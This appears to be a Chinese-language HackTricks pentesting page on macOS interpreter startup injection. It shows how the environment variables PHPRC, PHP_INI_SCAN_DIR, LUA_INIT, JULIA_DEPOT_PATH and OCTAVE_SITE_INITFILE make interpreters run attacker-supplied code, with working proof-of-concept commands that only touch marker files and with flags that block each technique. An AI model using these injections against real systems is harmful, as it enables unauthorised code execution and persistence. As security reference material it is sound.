# macOS Interpreter 启动文件注入

{{#include ../../../banners/hacktricks-training.md}}

这些特定于运行时的技术利用继承的环境变量，在执行预期脚本前选择启动配置或代码。Lua 也支持内联代码变体。

## PHP 启动配置

### `PHPRC` / `PHP_INI_SCAN_DIR` 和 `auto_prepend_file`

PHP CLI 和 CGI 每次调用时都会读取配置。`PHPRC` 可用于指定攻击者可读取的 `php.ini`，而 `PHP_INI_SCAN_DIR` 可用于重定向扫描其他 `.ini` 文件的目录。`auto_prepend_file` 指令会让 PHP 在执行请求的脚本前解析一个文件，因此这种组合会导致启动时执行代码。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

另一种方法是使用包含 `.ini` 文件的目录：

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

`-n` 选项会忽略 `php.ini`；显式指定的可信 `-c` 路径优先于 `PHPRC`。请记住，长时间运行的服务器 SAPI 通常会在 Web 服务器启动时读取配置，而 CLI 和 CGI 则会在每次调用时读取。<sup>[[1]](#references)</sup>

## Lua 启动代码

### `LUA_INIT`

在处理命令行选项或目标脚本之前，独立的 Lua 解释器会执行 `LUA_INIT_<major>_<minor>`；如果该版本变量不存在，则执行 `LUA_INIT`。以 `@` 开头的值表示文件名；其他值则会被直接作为 Lua 代码求值。这既支持基于文件的启动执行，也支持无文件启动执行。<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

具体的版本化名称会随解释器变化，例如 `LUA_INIT_5_4`。`lua -E` 会忽略所有环境变量，包括启动代码和 Lua 模块路径。

## Julia 启动 depot

### `JULIA_DEPOT_PATH` 和 `startup.jl`

Julia 通常会在启动时执行其第一个 depot 中的 `config/startup.jl`。`JULIA_DEPOT_PATH` 控制 depot 列表，因此将其指向攻击者可读取的目录树，就能重定向自动加载的启动文件。<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

尾随分隔符在受害者仍需要使用正常软件包时很有用。`julia --startup-file=no` 会禁用此启动文件。启动前清除该变量，因为它还控制软件包注册表、环境、缓存和代码加载位置。

## GNU Octave 启动文件

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave 启动时会执行多个包含有效 Octave 命令的文件。`OCTAVE_SITE_INITFILE` 会覆盖站点级启动文件，`OCTAVE_VERSION_INITFILE` 会覆盖特定版本的启动文件，因此任一变量都可将自动执行重定向到攻击者可读取的文件。<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` 只会跳过用户文件（例如 `~/.octaverc`）；它**不会**阻止上面的 site-file 覆盖。对于 site files，请使用 `--no-site-file`；若要禁用所有启动文件，请使用 `--norc` / `-f`。<sup>[[7]](#references)</sup>

## References

- [1] [PHP 配置文件](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4 独立解释器](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia 命令行界面：启动文件](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia 环境变量：`JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave 启动文件](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave 命令行选项](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
